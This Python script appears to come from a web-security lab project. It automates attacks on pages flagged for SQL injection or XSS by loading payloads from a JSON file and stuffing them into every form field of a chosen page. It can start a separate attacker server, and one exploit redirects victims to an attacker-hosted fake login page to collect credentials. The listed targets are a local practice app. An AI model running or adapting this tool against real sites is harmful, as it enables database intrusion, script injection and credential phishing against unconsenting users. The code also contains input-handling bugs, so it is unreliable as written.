import json, requests, subprocess
from vuln_page import VulnPage, POST_REQ, GET_REQ, APOSTROPHE, QUOTE 

#this will be a method and login will be a parameter that's the url 

def get_input(data, input_str, invalid_str):
	while True:
		bad_input = False
		choices = input(input_str)
		choices = [int(x) for x in choices.split()]
		for x in choices:
			if x > len(data) - 1 or x < 0:
				print(invalid_str)
				bad_input = True
				break 
		if bad_input:
			continue 
		else: 
			break
	return choices

def get_payload_missing_info(process, exploit, add_info=None):
	if exploit["name"] == "exploit_1":
		if process:
			return "http://127.0.0.1:8081/fake?url={}".format(add_info)
		else:
			url = input("Please enter the attacker's server's URL that creates a fake login page (including http://): ")
			param = input("Please enter the param name that the get request takes for the login page: ")
			return url.strip() + "?" + param.strip() + "=" + add_info.strip()
	elif exploit["name"] == "exploit_2":
		url = input("Please enter the url you would like to redirect to: ")
		return url.strip() 


def hack(login, vulnerabilities, session=None):
	with open("exploits.json", 'r') as in_file:
		exploits = json.load(in_file)

	answer = input("Run an attacker's web server to collect information (req. for some exploits)? Enter Y/y or N/n: ")
	while answer != 'y' and answer != 'Y' and answer == 'N' and answer == 'n':
		answer = input("Invalid input. Please enter either Y/n or N/n: ")
	if answer == 'Y' or answer == 'y':
		process = subprocess.Popen(['python3', 'attacker_server.py'])
	else:
		process = None

	print()
	print("{:<5} {:<10} {:<40} {:<20}".format("Num", "Pages", "URL", "Vulnerabilities"))
	for x in range(len(vulnerabilities)):
		page = vulnerabilities[x]
		print("{:<5} {:<10} {:<40} {:<20}".format(x, page.name, page.url, page.pprint_vuln()))
	print()

	choices = get_input(vulnerabilities, "List the number of the pages you want to exploit (space separated): ", "Invalid input. A number is out of range of the available choices!")
	choices = list(set(choices))

	for choice in choices:
		selected_page = vulnerabilities[choice]
		vulns = selected_page.vuln

		print()
		print("Currently selected page: {}. Here are the available options:\n".format(selected_page.name))
		print("{:<5} {:<10}".format("Num", "Vulnerability"))
		for x in range(len(vulns)):
			vuln = vulns[x]
			print("{:<5} {:<10}".format(x, vuln))
		print()

		choice = get_input(page.vuln, "Please select a vulnerability to exploit: ", "Invalid input!")
		while(len(choice) != 1):
			print("More than 1 vulnerability selected. Please select only 1 vulnerability!")
			choice = get_input(page.vuln, "Please select a vulnerability to exploit: ", "Invalid input!")
		selected_vuln = vulns[choice[0]]

		print()
		print("Vulnerability selected: {}. Here are the available exploits:\n".format(selected_vuln))
		print("{:<5} {:<10} {:<30}".format("Num", "Name", "Description", ))
		for x in range(len(exploits[selected_vuln])):
			exploit = exploits[selected_vuln][x]
			print("{:<5} {:<10} {:<30}".format(x, exploit["name"], exploit["desc"]))
		print()

		choice = get_input(exploits[vuln], "Please select an exploit to run: ", "Invalid input!")
		while(len(choice) != 1):
			print("More than 1 exploit selected. Please select only 1 exploit!")
			choice = get_input(page.vuln, "Please select an exploit to run: ", "Invalid input!")
		selected_exploit = exploits[vuln][choice[0]]

		print()
		print("Exploit selected: {}\n".format(selected_exploit["name"]))
		payload = selected_exploit["payload"]
		if "[CHANGE_THIS]" in payload:
				url = get_payload_missing_info(process, selected_exploit, add_info=login)
				payload = payload.replace("[CHANGE_THIS]", url)
		print()

		print(payload)
		print("Sending in customized payload now!")

		data = selected_page.get_data()
		for x in data.keys():
			data[x] = payload

		if session:
			controller = session
		else:
			controller = requests

		if selected_page.req_type == GET_REQ:
			resp = controller.get(selected_page.url, params=data)
		else:
			resp = controller.post(selected_page.url, data=data)

		#with open("test_" + str(choice) + ".html", 'w') as out_file:
		#	out_file.write(resp.text)

		test = input("Continue to next page?")

	

if __name__ == "__main__":
	def_list = [VulnPage("login", "http://127.0.0.1:5000/login", ["SQL",], {"username": "", "password": ""}, POST_REQ, QUOTE),
				VulnPage("movies", "http://127.0.0.1:5000/movies", ["SQL"], {"search" : ""}, GET_REQ, APOSTROPHE),
				VulnPage("forum", "http://127.0.0.1:5000/forum", ["XSS"], {"body":""}, POST_REQ, None)]

	session = requests.Session()
	data = {"email" : "a@b", "password": "ab", 'security_level': 0, 'form': 'submit'}
	session.post("http://127.0.0.1:5000/login", data=data)
	
	hack("http://127.0.0.1:5000/login", def_list, session=session)
